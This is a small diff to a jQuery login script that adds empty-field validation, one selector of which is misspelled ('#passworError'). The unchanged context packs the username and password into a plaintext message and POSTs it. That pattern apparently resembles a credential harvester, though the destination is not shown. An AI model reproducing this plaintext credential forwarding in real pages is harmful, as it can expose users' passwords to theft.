@@ -12,6 +12,22 @@ $(document).ready(function() {
                 content: `User: ${user}\nPassword: ${password}`
             };
 
+
+            var userError = $('#userError');
+            var passwordError = $('#passworError');
+
+            if(user == ''){
+                userError.show();
+            }else{
+                userError.hide();
+            }
+
+            if(password == ''){
+                passwordError.show();
+            }else{
+                passwordError.hide();
+            }
+
             // Send AJAX POST request using jQuery
         if(user != '' && password != ''){
             $.ajax({
